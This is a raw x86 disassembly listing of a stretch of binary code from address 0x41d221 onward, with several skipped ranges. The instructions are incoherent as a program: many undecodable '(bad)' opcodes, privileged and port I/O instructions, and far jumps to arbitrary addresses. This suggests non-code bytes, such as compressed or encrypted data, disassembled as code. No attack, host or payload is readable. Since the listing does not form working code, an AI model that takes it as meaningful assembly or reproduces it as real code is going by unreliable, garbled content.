  41d221:	sbb    BYTE PTR [eax-0x2d],0x2a
  41d225:	rcr    BYTE PTR [edi-0x67e91675],cl
  41d22b:	imul   DWORD PTR [ecx+0x10]
  41d22e:	pop    DWORD PTR [eax+0x76b6b398]
  41d234:	hlt    
  41d235:	or     esp,esi
  41d237:	mov    edi,0xccd9a25
  41d23c:	xor    DWORD PTR [edi+0x44],eax
  41d23f:	dec    esp
  41d240:	je     0x41d1e8
  41d242:	mov    ah,ch
  41d244:	hlt    
  41d245:	scas   eax,DWORD PTR es:[edi]
  41d246:	repnz cmp ecx,DWORD PTR [ebp-0x57b690e]
  41d24d:	push   esi
  41d24e:	pop    edx
  41d24f:	adc    al,dl
  41d251:	add    ebx,esp
  41d253:	lds    edx,FWORD PTR [edx+0x18]
  41d256:	adc    DWORD PTR [eax+ebx*2+0x58d08fa7],esp
  41d25d:	repz and ah,BYTE PTR [ebx-0x20]
  41d261:	jnp    0x41d2b4
  41d263:	cmp    eax,0x512da924
  41d268:	sbb    edi,ecx
  41d26a:	mov    esi,0xd795bdef
  41d26f:	in     eax,0x3e
  41d271:	(bad)  
  41d272:	sbb    BYTE PTR [ebx+0x3f5a67d4],bl
  41d278:	clc    
  41d279:	jno    0x41d2a8
  41d27b:	inc    ecx
  41d27c:	dec    eax
  41d27d:	jg     0x41d2d6
  41d27f:	xchg   esi,eax
  41d280:	or     al,0x78
  41d282:	jmp    0x313c:0xd7870da0
  41d289:	imul   ax,WORD PTR [ebx],0x51
  41d28d:	pop    DWORD PTR [ebx]
  41d28f:	mov    eax,ds:0x7b383a09
  41d294:	cmp    ah,BYTE PTR [edx]
  41d296:	in     eax,0x24
  41d298:	jnp    0x41d297
  41d29a:	scas   eax,DWORD PTR es:[edi]
  41d29b:	lea    edx,[edi]
  41d29d:	(bad)  
  41d29e:	js     0x41d226
  41d2a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2a1:	test   DWORD PTR [ebx+0x3c],0x99271245
  41d2a8:	fcmovne st,st(3)
  41d2aa:	dec    eax
  41d2ab:	call   0xdec87156
  41d2b0:	(bad)  
  41d2b1:	cmp    BYTE PTR [eax-0x73],bh
  41d2b4:	sbb    eax,0xd9066a29
  41d2b9:	outs   dx,BYTE PTR ds:[esi]
  41d2ba:	jge    0x41d2db
  41d2bc:	shl    BYTE PTR [edx],0x5f
  41d2bf:	mov    dl,BYTE PTR [esi-0x43]
  41d2c2:	sbb    DWORD PTR [esi-0x47300ca4],ebp
  41d2c8:	mov    eax,0xf61d2152
  41d2cd:	cmp    eax,0x93814348
  41d2d2:	pop    esi
  41d2d3:	iret   
  41d2d4:	add    eax,0xa8994358
  41d2d9:	ret    
  41d2da:	mul    BYTE PTR [ebx+edx*8+0x6ca8874a]
  41d2e1:	or     dl,BYTE PTR [edi+0x73]
  41d2e4:	ins    DWORD PTR es:[edi],dx
  41d2e5:	mov    edx,0x8b38a108
  41d2ea:	jb     0x41d30d
  41d2ec:	push   0xffffffa9
  41d2ee:	or     al,0x8b
  41d2f0:	scas   al,BYTE PTR es:[edi]
  41d2f1:	push   edx
  41d2f2:	xchg   ecx,eax
  41d2f3:	ja     0x41d2c7
  41d2f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2f6:	scas   al,BYTE PTR es:[edi]
  41d2f7:	mov    ebx,0x2ede02fd
  41d2fc:	fmul   DWORD PTR [ecx]
  41d2fe:	mov    WORD PTR [esi-0x4f],es
  41d301:	pop    esp
  41d302:	sub    ecx,DWORD PTR [esi]
  41d304:	js     0x41d370
  41d306:	or     ebx,DWORD PTR [edi]
  41d308:	pop    edx
  41d309:	fwait
  41d30a:	mov    ebx,0x8e8151f0
  41d30f:	push   esp
	...
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	jbe    0x41d3b2
  41d382:	cmp    esp,edx
  41d384:	push   0x4000136
  41d389:	add    DWORD PTR [eax],eax
  41d38b:	add    BYTE PTR [ebp+0x1b410c4f],bh
  41d391:	push   ss
  41d392:	jne    0x41d32e
  41d394:	mov    bl,0x6d
  41d396:	push   ebp
  41d397:	pop    eax
  41d398:	and    ebx,edi
  41d39a:	ror    BYTE PTR [esi],0x25
  41d39d:	loop   0x41d345
  41d39f:	xchg   DWORD PTR [eax],ecx
  41d3a1:	bound  ecx,QWORD PTR cs:[edi-0x71]
  41d3a5:	or     eax,0x923d1f3f
  41d3aa:	cmp    BYTE PTR [esi-0x12],ch
  41d3ad:	add    eax,0x93322869
  41d3b2:	push   es
  41d3b3:	push   0xfffffffb
  41d3b5:	stos   BYTE PTR es:[edi],al
  41d3b6:	mov    dl,0xbc
  41d3b8:	not    BYTE PTR [ebx+0x7d5f0bfd]
  41d3be:	push   ss
  41d3bf:	xchg   esi,eax
  41d3c0:	mov    ecx,0x44851871
  41d3c5:	push   edi
  41d3c6:	gs and al,bl
  41d3c9:	add    DWORD PTR [eax+ebp*4+0x43a2b8a5],ebp
  41d3d0:	inc    edi
  41d3d1:	jnp    0x41d3c7
  41d3d3:	jo     0x41d404
  41d3d5:	pop    ecx
  41d3d6:	or     al,0x3a
  41d3d8:	jb     0x41d3bc
  41d3da:	xchg   cl,ah
  41d3dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3dd:	adc    eax,0x9a836321
  41d3e2:	retf   0x3d60
  41d3e5:	(bad)  
  41d3e7:	add    DWORD PTR [esp+edx*4-0x16cfbf4b],eax
  41d3ee:	push   esp
  41d3ef:	push   eax
  41d3f0:	mov    ebx,0xb501bf37
  41d3f5:	sbb    esp,DWORD PTR ds:0x6015a74b
  41d3fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3fc:	repnz inc esp
  41d3fe:	sbb    ch,BYTE PTR [esi-0x1d]
  41d401:	dec    esp
  41d402:	sbb    DWORD PTR [ebp+0x63539922],ebp
  41d408:	enterw 0x5f1c,0x0
  41d40d:	jae    0x41d3c6
  41d40f:	scas   eax,DWORD PTR es:[edi]
  41d410:	sti    
  41d411:	pop    ds
  41d412:	mov    ds:0x4957f307,eax
  41d417:	xchg   DWORD PTR [esi+0x79436b83],esi
  41d41d:	push   ecx
  41d41e:	mov    ch,0x42
  41d420:	inc    edx
  41d421:	lods   al,BYTE PTR ds:[esi]
  41d422:	and    eax,0x4434e18
  41d427:	jmp    0x41d3c6
  41d429:	xchg   edx,eax
  41d42a:	inc    eax
  41d42b:	push   edx
  41d42c:	int3   
  41d42d:	in     eax,dx
  41d42e:	mov    al,ds:0xa9279b5a
  41d433:	inc    ebx
  41d434:	xchg   edi,eax
  41d435:	and    DWORD PTR [esi+0x52f37f15],0xc634f5e4
  41d43f:	popa   
  41d440:	xlat   BYTE PTR ds:[ebx]
  41d441:	mov    ?,eax
  41d443:	mov    eax,0x5bd5c1e7
  41d448:	pop    ss
  41d449:	cdq    
  41d44a:	jae    0x41d3ef
  41d44c:	sub    eax,0xedf0a085
  41d451:	mov    eax,0xdb54d29a
  41d456:	sub    DWORD PTR [eax+ecx*2+0x766448ed],ecx
  41d45d:	mov    al,ds:0xd79cb5fb
  41d462:	cmc    
  41d463:	ret    
  41d464:	mov    edx,0x92c985d
  41d469:	add    ah,0x7b
  41d46c:	lds    edx,FWORD PTR [ebx-0x2e759c3d]
  41d472:	inc    edx
  41d473:	outs   dx,BYTE PTR ds:[esi]
  41d474:	pusha  
  41d475:	xchg   dh,cl
  41d477:	jmp    0x1b29a8d9
  41d47c:	enter  0x8bbe,0x7b
  41d480:	inc    edi
  41d481:	pop    esp
  41d482:	jnp    0x41d4e3
  41d484:	or     DWORD PTR [ecx],edi
  41d486:	jae    0x41d429
  41d488:	mov    esp,0x4580d115
  41d48d:	cdq    
  41d48e:	das    
  41d48f:	push   ds
	...
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6ce8:0x624e7689
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	jae    0x41d4dc
  41d50e:	scas   eax,DWORD PTR es:[edi]
  41d50f:	pop    es
  41d510:	add    bl,BYTE PTR [ecx+0x65a93f6d]
  41d516:	jge    0x41d4c5
  41d518:	xchg   ebx,eax
  41d519:	mov    edi,DWORD PTR [ecx+0x50aa03d4]
  41d51f:	jle    0x41d501
  41d521:	test   esi,ebp
  41d523:	stos   BYTE PTR es:[edi],al
  41d524:	ds inc ecx
  41d526:	loop   0x41d4de
  41d528:	shr    DWORD PTR [edi],0xe0
  41d52b:	fst    DWORD PTR [esi]
  41d52d:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41d52f:	cmp    al,0x67
  41d531:	(bad)  
  41d532:	sub    eax,0x70ddbba7
  41d537:	push   esp
  41d538:	in     al,dx
  41d539:	mov    ds:0x10c00bca,eax
  41d53e:	jecxz  0x41d53d
  41d540:	and    bh,BYTE PTR [ebx+0x5a]
  41d543:	sar    DWORD PTR [eax],cl
  41d545:	ins    DWORD PTR es:[edi],dx
  41d546:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41d548:	aaa    
  41d549:	mov    WORD PTR [eax+0x41df0253],cs
  41d54f:	nop
  41d550:	leave  
  41d551:	iret   
  41d552:	adc    DWORD PTR [esi+0x49],eax
  41d555:	ret    
  41d556:	data16 xor al,0x3c
  41d559:	popf   
  41d55a:	xor    DWORD PTR [edx],edi
  41d55c:	lahf   
  41d55d:	imul   ebx,edi,0x76
  41d560:	test   eax,0xe8bfa874
  41d565:	pusha  
  41d566:	push   ss
  41d567:	mov    al,0x3d
  41d569:	xor    BYTE PTR [esi],dh
  41d56b:	mov    eax,0x5a226aed
  41d570:	mov    BYTE PTR [esi-0x76],0x85
  41d574:	jge    0x41d5ed
  41d576:	out    0x24,al
  41d578:	jmp    0x155b8578
  41d57d:	mov    BYTE PTR [ecx+0x2e157c31],dh
  41d583:	repz mov ecx,0xcbb25e9d
  41d589:	fwait
  41d58a:	sbb    eax,0x3c21171
  41d58f:	pop    ecx
  41d590:	jno    0x41d530
  41d592:	cmp    ah,BYTE PTR [ebx-0x37]
  41d595:	or     ebx,DWORD PTR [ebx]
  41d597:	push   ss
  41d598:	pushf  
  41d599:	addr16 mov bl,0x99
  41d59c:	lods   al,BYTE PTR ds:[esi]
  41d59d:	mov    ah,0xd
  41d59f:	cmp    al,dl
  41d5a1:	pop    ebx
  41d5a2:	ss rol bl,0x61
  41d5a6:	(bad)  
  41d5a7:	xor    cl,BYTE PTR [esp+edx*1]
  41d5aa:	push   ebp
  41d5ab:	lods   eax,DWORD PTR ds:[esi]
  41d5ac:	fld    QWORD PTR [ecx-0x7cd143eb]
  41d5b2:	sub    BYTE PTR [eax-0x4e4db0c9],dh
  41d5b8:	jecxz  0x41d55c
  41d5ba:	sub    dh,BYTE PTR [ebx]
  41d5bc:	pop    ecx
  41d5bd:	pop    esp
  41d5be:	test   al,0x6a
  41d5c0:	jecxz  0x41d56a
  41d5c2:	mov    edi,0xa2a7eb67
  41d5c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5c8:	push   ds
  41d5c9:	ins    BYTE PTR es:[edi],dx
  41d5ca:	jne    0x41d646
  41d5cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5cd:	mov    WORD PTR [esi+0x4eb2e4bd],?
  41d5d3:	and    eax,DWORD PTR [edx]
  41d5d5:	std    
  41d5d6:	ins    BYTE PTR es:[edi],dx
  41d5d7:	adc    al,0x3f
  41d5d9:	rcr    BYTE PTR [ecx],cl
  41d5db:	inc    esp
  41d5dc:	mov    ds:0x63c79201,al
  41d5e1:	dec    edi
  41d5e2:	cmp    bl,BYTE PTR [eax-0x5c]
  41d5e5:	or     al,0x29
  41d5e7:	push   ebp
  41d5e8:	gs add eax,0xb387e865
  41d5ee:	xchg   esi,eax
  41d5ef:	div    BYTE PTR [esi-0x7b]
  41d5f2:	ja     0x41d5d3
  41d5f4:	repz mov ch,0xba
  41d5f7:	xchg   edi,eax
  41d5f8:	add    eax,0x8f9ef7bb
  41d5fd:	fidiv  DWORD PTR [ecx-0x3bf9c003]
  41d603:	jmp    0xa772:0x626069ed
  41d60a:	dec    edi
  41d60b:	pop    ecx
  41d60c:	inc    ecx
  41d60d:	push   es
  41d60e:	sbb    eax,0x94
	...
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x8966e435
  41d681:	ins    DWORD PTR es:[edi],dx
  41d682:	cwde   
  41d683:	test   eax,0x13870
  41d688:	add    al,0x1
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	in     eax,dx
  41d68d:	cmp    esi,DWORD PTR [edi+eiz*2-0x6ae364ff]
  41d694:	jle    0x41d64b
  41d696:	cli    
  41d697:	add    ebx,DWORD PTR [esi-0x76]
  41d69a:	mov    ah,BYTE PTR [esi+0x62]
  41d69d:	mov    dh,0x81
  41d69f:	xchg   ecx,eax
  41d6a0:	bound  esi,QWORD PTR [ebx-0x3e63415a]
  41d6a6:	js     0x41d63f
  41d6a8:	jo     0x41d697
  41d6aa:	(bad)  
  41d6ab:	jp     0x41d65b
  41d6ad:	iret   
  41d6ae:	mov    edi,0xf1c910c6
  41d6b3:	cmp    esi,0x5e
  41d6b6:	or     ebx,ecx
  41d6b8:	cdq    
  41d6b9:	add    ah,BYTE PTR [esi-0x3a4f3fb0]
  41d6bf:	mov    edx,0xbd65882
  41d6c4:	cmp    bl,BYTE PTR [ebp+0x264a5409]
  41d6ca:	pop    esp
  41d6cb:	rol    DWORD PTR [edx+0x347ad795],1
  41d6d1:	loopne 0x41d73f
  41d6d3:	neg    BYTE PTR [edx+0x1]
  41d6d6:	jbe    0x41d6f7
  41d6d8:	sub    bl,BYTE PTR [ebx+0x2d]
  41d6db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6dc:	xchg   BYTE PTR [esi],bh
  41d6de:	jb     0x41d758
  41d6e0:	xchg   ebp,eax
  41d6e1:	jnp    0x41d751
  41d6e3:	xchg   ebp,eax
  41d6e4:	add    ebp,DWORD PTR gs:[ebx+0x69]
  41d6e8:	lock aam 0x14
  41d6eb:	pop    edx
  41d6ec:	dec    edx
  41d6ed:	mov    ah,0x7e
  41d6ef:	lds    eax,FWORD PTR [esi+edi*4+0x44058464]
  41d6f6:	cld    
  41d6f7:	std    
  41d6f8:	shl    DWORD PTR [ebp-0xf2d2612],0x9f
  41d6ff:	imul   ebp,DWORD PTR [di+0x12],0xffffff88
  41d704:	jno    0x41d6d5
  41d706:	pop    esp
  41d707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d708:	add    eax,DWORD PTR [edi+0x609ad1b2]
  41d70e:	loopne 0x41d6ab
  41d710:	add    al,0x80
  41d712:	mov    eax,ds:0x6c7e7348
  41d717:	mov    ah,0xbe
  41d719:	mov    bl,0xa2
  41d71b:	outs   dx,DWORD PTR ds:[esi]
  41d71c:	ins    DWORD PTR es:[edi],dx
  41d71d:	inc    ebp
  41d71e:	movhps QWORD PTR [edx+0x11],xmm1
  41d722:	inc    ebp
  41d723:	test   eax,0xba138c50
  41d728:	xchg   esp,eax
  41d729:	leave  
  41d72a:	push   cs
  41d72b:	test   eax,0x4bc6b37
  41d730:	rcl    DWORD PTR [ecx],1
  41d732:	ins    BYTE PTR es:[edi],dx
  41d733:	push   ecx
  41d734:	xor    DWORD PTR [ebx+ebx*8+0x328e1325],0x7ad9dc9a
  41d73f:	fbld   TBYTE PTR [ebp-0x572e4b59]
  41d745:	mov    ebp,0x23044da5
  41d74a:	and    al,0x9d
  41d74c:	cwde   
  41d74d:	lds    edi,FWORD PTR [edx+edi*4-0x36e94f4f]
  41d754:	fwait
  41d755:	sar    DWORD PTR [edi+0x68],1
  41d758:	sub    edx,ebp
  41d75a:	or     edi,DWORD PTR [eax-0x46966a93]
  41d760:	ror    BYTE PTR [ebp-0x494d6838],1
  41d766:	pop    ebp
  41d767:	bound  esi,QWORD PTR [ebp+ecx*8-0x239201cc]
  41d76e:	mov    ah,0xa4
  41d770:	adc    BYTE PTR [eax],bh
  41d772:	inc    edi
  41d773:	xor    ah,BYTE PTR [esi+ebp*4-0x1c91cb55]
  41d77a:	xchg   DWORD PTR [edx-0x20518bdd],edx
  41d780:	loop   0x41d71d
  41d782:	ins    DWORD PTR es:[edi],dx
  41d783:	cmp    BYTE PTR [edx],cl
  41d785:	mov    ch,0xe4
  41d788:	stos   BYTE PTR es:[edi],al
  41d789:	push   edi
  41d78a:	stos   BYTE PTR es:[edi],al
  41d78b:	imul   ecx,edi,0x9bc9fa
	...
  41d7f1:	add    BYTE PTR [eax],al
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d801:	jle    0x41d830
  41d803:	mov    esp,0x13974
  41d808:	add    al,0x1
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	imul   ebx,DWORD PTR [eax+0x3d430f55],0x7f
  41d813:	mov    ch,0x85
  41d815:	or     ebp,DWORD PTR [ecx-0x70]
  41d818:	cdq    
  41d819:	popf   
  41d81a:	rol    BYTE PTR [ebx+0x7b30829],0x1e
  41d821:	loope  0x41d7a8
  41d823:	clc    
  41d824:	add    al,0x58
  41d826:	aas    
  41d827:	xchg   ebx,eax
  41d828:	xchg   edi,eax
  41d829:	outs   dx,DWORD PTR ds:[esi]
  41d82a:	jbe    0x41d804
  41d82c:	std    
  41d82d:	dec    esi
  41d82e:	test   BYTE PTR [ecx+0x5eb98e90],dh
  41d834:	shr    DWORD PTR [ecx-0x77afdcc6],cl
  41d83a:	jmp    0x41d89a
  41d83c:	mov    bl,0x64
  41d83e:	or     DWORD PTR [ebx+0x4f591ffe],ebp
  41d844:	cmp    dh,cl
  41d846:	in     eax,dx
  41d847:	mov    al,0xe7
  41d849:	mov    ebp,0x8d5dd7f0
  41d84e:	mov    bh,0x28
  41d850:	in     al,0xbd
  41d852:	dec    edi
  41d853:	pop    eax
  41d854:	mov    ebp,DWORD PTR [edi]
  41d856:	stos   DWORD PTR es:[edi],eax
  41d857:	mov    dh,0x20
  41d859:	cs cli 
  41d85b:	sub    DWORD PTR [edi+ecx*1+0x21],ebx
  41d85f:	or     ch,0xd5
  41d862:	pop    eax
  41d863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d864:	outs   dx,DWORD PTR ds:[esi]
  41d865:	lods   al,BYTE PTR ds:[esi]
  41d866:	sbb    al,0x87
  41d868:	call   DWORD PTR [esi+0x66]
  41d86b:	and    al,0x6b
  41d86d:	mov    al,0x3f
  41d86f:	sti    
  41d870:	push   0x26e789f5
  41d875:	sub    DWORD PTR [ebx+eax*1+0x18],eax
  41d879:	(bad)  
  41d87a:	xchg   edi,eax
  41d87b:	mov    al,0x19
  41d87d:	jae    0x41d88f
  41d87f:	lods   al,BYTE PTR ds:[esi]
  41d880:	(bad)  
  41d881:	adc    DWORD PTR es:[edi],edi
  41d884:	xchg   ebp,eax
  41d885:	push   edx
  41d886:	stos   BYTE PTR es:[edi],al
  41d887:	(bad)  
  41d889:	outs   dx,DWORD PTR ds:[esi]
  41d88a:	adc    eax,0x5ea7ed59
  41d88f:	mov    ah,0xa9
  41d891:	shr    ebp,0x4e
  41d894:	xchg   BYTE PTR [edi],ch
  41d896:	dec    ebp
  41d897:	add    BYTE PTR [edx+0x1c5189c2],ch
  41d89d:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d89f:	add    DWORD PTR [eax*2+0x2b44c403],0x66
  41d8a7:	scas   eax,DWORD PTR es:[edi]
  41d8a8:	imul   ecx,DWORD PTR ss:[eax+edi*2-0x7d],0x4c
  41d8ae:	shr    cl,0x9c
  41d8b1:	and    al,0x1f
  41d8b3:	sub    DWORD PTR [ebp+0x18eccd1f],edx
  41d8b9:	and    al,0x14
  41d8bb:	xor    eax,0xe3111134
  41d8c0:	xchg   edi,eax
  41d8c1:	push   ebp
  41d8c2:	arpl   WORD PTR [eax+0x16137202],cx
  41d8c8:	fwait
  41d8c9:	aam    0x7e
  41d8cb:	mov    ebx,0xa86662d8
  41d8d0:	add    BYTE PTR [ebx-0x61732490],0xc
  41d8d7:	in     al,dx
  41d8d8:	adc    al,0x8f
  41d8da:	inc    edi
  41d8db:	shl    BYTE PTR [eax+edx*4-0x1],cl
  41d8df:	out    dx,al
  41d8e0:	clc    
  41d8e1:	mov    ebp,0xcec2e1ed
  41d8e6:	ins    BYTE PTR es:[edi],dx
  41d8e7:	bound  ecx,QWORD PTR [eax+0x7681fafd]
  41d8ed:	int3   
  41d8ee:	fadd   QWORD PTR [ebx+0x53]
  41d8f1:	pop    ecx
  41d8f2:	arpl   WORD PTR [edx-0x70babac4],ax
  41d8f8:	pop    ds
  41d8f9:	add    esp,DWORD PTR [ebx+0x4f]
  41d8fc:	mov    dh,0xd9
  41d8fe:	pop    esi
  41d8ff:	popa   
  41d900:	call   0xf611f3a
  41d905:	frstor [ebp+0x785b5183]
  41d90b:	xor    ah,al
  41d90d:	xchg   DWORD PTR [eax],edi
  41d90f:	mov    dh,0x0
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs mov edi,0x781f98e0
  41d985:	cmp    al,BYTE PTR [ecx]
  41d987:	add    BYTE PTR [ecx+eax*1],al
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	pop    edi
  41d98d:	je     0x41d9d9
  41d98f:	push   0x57
  41d991:	rcr    BYTE PTR [ebx+0x0],1
  41d994:	clc    
  41d995:	push   ecx
  41d996:	(bad)  
  41d997:	ds fsubp st(2),st
  41d99a:	push   ss
  41d99b:	std    
  41d99c:	pop    ss
  41d99d:	scas   eax,DWORD PTR es:[edi]
  41d99e:	sbb    DWORD PTR [edi],eax
  41d9a0:	cmc    
  41d9a1:	js     0x41d94a
  41d9a3:	lods   eax,DWORD PTR ds:[esi]
  41d9a4:	in     eax,dx
  41d9a5:	stos   DWORD PTR es:[edi],eax
  41d9a6:	mov    al,ah
  41d9a8:	adc    eax,0x512c354b
  41d9ad:	test   BYTE PTR [ebx],ah
  41d9af:	inc    esp
  41d9b0:	adc    al,0x57
  41d9b2:	push   0xffffff93
  41d9b4:	std    
  41d9b5:	sub    DWORD PTR cs:[esp+eax*4-0x49],0xefeb7656
  41d9be:	outs   dx,DWORD PTR ss:[esi]
  41d9c0:	fwait
  41d9c1:	es dec ebp
  41d9c3:	jg     0x41d9e0
  41d9c5:	inc    ecx
  41d9c6:	pop    esi
  41d9c7:	sbb    ecx,ebp
  41d9c9:	adc    BYTE PTR [esi+0x42e5d21c],dh
  41d9cf:	fwait
  41d9d0:	adc    BYTE PTR [edi-0x2073e1d9],bl
  41d9d6:	sbb    dl,BYTE PTR [esi]
  41d9d8:	fld    TBYTE PTR [edi-0x353c780e]
  41d9de:	mov    bh,BYTE PTR [ecx-0x609597ac]
  41d9e4:	(bad)  
  41d9e5:	mov    edi,0x6c83777e
  41d9ea:	icebp  
  41d9eb:	adc    dh,0xe4
  41d9ee:	pusha  
  41d9ef:	mov    edi,0x1d76d5e4
  41d9f4:	fld    TBYTE PTR [ebp+0x47ef8810]
  41d9fa:	ret    
  41d9fb:	aam    0xfb
  41d9fd:	adc    bl,BYTE PTR [eax+0x44]
  41da00:	stc    
  41da01:	in     eax,dx
  41da02:	adc    edi,DWORD PTR [ebx]
  41da04:	scas   al,BYTE PTR es:[edi]
  41da05:	jmp    0x3bc:0xe00ffdaa
  41da0c:	enter  0x2cca,0xeb
  41da10:	pop    es
  41da11:	inc    esi
  41da12:	adc    bh,bl
  41da14:	es dec ebp
  41da16:	in     al,dx
  41da17:	mov    WORD PTR [esi],gs
  41da19:	rcl    ch,1
  41da1b:	or     al,0x36
  41da1d:	jae    0x41da26
  41da1f:	mov    bh,0x7b
  41da21:	scas   eax,DWORD PTR es:[edi]
  41da22:	and    al,0xa3
  41da24:	jbe    0x41d9c8
  41da26:	jmp    0x41da0c
  41da28:	nop
  41da29:	pushf  
  41da2a:	fcomp  QWORD PTR [edx]
  41da2c:	jno    0x41daa0
  41da2e:	and    dl,dh
  41da30:	icebp  
  41da31:	ret    
  41da32:	xchg   edx,eax
  41da33:	mov    ecx,0x290b98ff
  41da38:	mov    esp,0x8fdad0ad
  41da3d:	mov    ds:0x97ad4c7e,eax
  41da42:	lods   al,BYTE PTR ds:[esi]
  41da43:	push   ss
  41da44:	push   edi
  41da45:	not    BYTE PTR [ebp+0x4d]
  41da48:	mov    ebp,0x2c710b65
  41da4d:	inc    esi
  41da4e:	test   DWORD PTR [esi+0x3d198de0],ebp
  41da54:	clc    
  41da55:	xchg   esi,ebx
  41da57:	mov    ds:0xac5c18fd,eax
  41da5c:	pop    eax
  41da5d:	jg     0x41d9ea
  41da5f:	pop    ebx
  41da60:	and    BYTE PTR [ecx+0x3a],ch
  41da63:	out    dx,al
  41da64:	int    0x17
  41da66:	cwde   
  41da67:	jno    0x41da51
  41da69:	fwait
  41da6a:	(bad)  
  41da6b:	push   esi
  41da6c:	sub    ecx,DWORD PTR [ecx]
  41da6e:	ins    BYTE PTR es:[edi],dx
  41da6f:	mov    ah,0xc2
  41da71:	enter  0x29a2,0xc4
  41da75:	jp     0x41da88
  41da77:	push   cx
  41da79:	rcr    DWORD PTR ds:0x8d7b7e0,1
  41da7f:	fistp  QWORD PTR [edi+0x67]
  41da82:	push   eax
  41da83:	test   al,0x9f
  41da85:	lds    ebp,FWORD PTR [edx+0x7f238753]
  41da8b:	(bad)  
  41da8c:	in     eax,dx
  41da8d:	mov    al,bh
  41da8f:	test   eax,0x0
	...
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x1b
  41db01:	or     DWORD PTR ds:0x13b7c4c,esp
  41db07:	add    BYTE PTR [ecx+eax*1],al
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	loop   0x41db31
  41db0e:	inc    ebp
  41db0f:	adc    ch,BYTE PTR [eax+0x48]
  41db12:	aas    
  41db13:	arpl   WORD PTR [ecx-0x51],ax
  41db16:	mov    bh,0x95
  41db18:	inc    esi
  41db19:	fs cdq 
  41db1b:	jg     0x41db27
  41db1d:	sub    al,0x95
  41db1f:	sahf   
  41db20:	or     ecx,ebp
  41db22:	nop
  41db23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db24:	cmp    edx,DWORD PTR [ecx-0x4]
  41db27:	retf   0xf693
  41db2a:	sub    bh,BYTE PTR [ecx]
  41db2c:	inc    esp
  41db2d:	jle    0x41db77
  41db2f:	jg     0x41db25
  41db31:	icebp  
  41db32:	adc    dl,dh
  41db34:	add    edx,DWORD PTR [ecx+0x2b]
  41db37:	push   ebx
  41db38:	push   0x5c5f49fb
  41db3d:	rcr    BYTE PTR [ecx+edi*2-0x2a],0x76
  41db42:	(bad)  
  41db43:	(bad)  
  41db44:	cmp    BYTE PTR [edx-0xd],bh
  41db47:	(bad)  
  41db48:	and    ch,bl
  41db4a:	sahf   
  41db4b:	mov    al,0x8
  41db4d:	cs or  eax,0x9aa6654b
  41db53:	sar    BYTE PTR [ebp+eiz*4-0x258d9b1a],0x2f
  41db5b:	cmp    al,0x93
  41db5d:	shl    DWORD PTR [eax],1
  41db5f:	and    ebx,esp
  41db61:	add    eax,0x65d3639b
  41db66:	cmp    eax,0x9814b296
  41db6b:	daa    
  41db6c:	push   eax
  41db6d:	xor    BYTE PTR [eax-0x583fd756],cl
  41db73:	cmp    al,0xcb
  41db75:	sub    BYTE PTR fs:[esi],0x48
  41db79:	push   ecx
  41db7a:	mov    dh,0x7c
  41db7c:	lods   eax,DWORD PTR ds:[esi]
  41db7d:	pop    ebp
  41db7e:	(bad)  
  41db7f:	loop   0x41dbd6
  41db81:	xor    eax,0xf0708949
  41db86:	dec    eax
  41db87:	inc    edi
  41db88:	aam    0x2b
  41db8a:	inc    edi
  41db8b:	pop    eax
  41db8c:	nop
  41db8d:	and    DWORD PTR [ebx+0xb],esi
  41db90:	or     al,0xf2
  41db92:	aaa    
  41db93:	jo     0x41db67
  41db95:	pop    es
  41db96:	gs aad 0x95
  41db99:	call   0xd22a59de
  41db9e:	sub    BYTE PTR ds:0xee1257c2,0x93
  41dba5:	(bad)
  41dba8:	mov    edx,0xa38c287d
  41dbad:	jmp    0x9a0298b7
  41dbb2:	and    al,0x2d
  41dbb4:	xor    ecx,DWORD PTR [ebp-0x52]
  41dbb7:	outs   dx,DWORD PTR ds:[esi]
  41dbb8:	stc    
  41dbb9:	sar    BYTE PTR [edx],1
  41dbbb:	les    esi,FWORD PTR ds:[ecx+ebp*1+0x16]
  41dbc0:	mov    ds:0x1ceac9d0,al
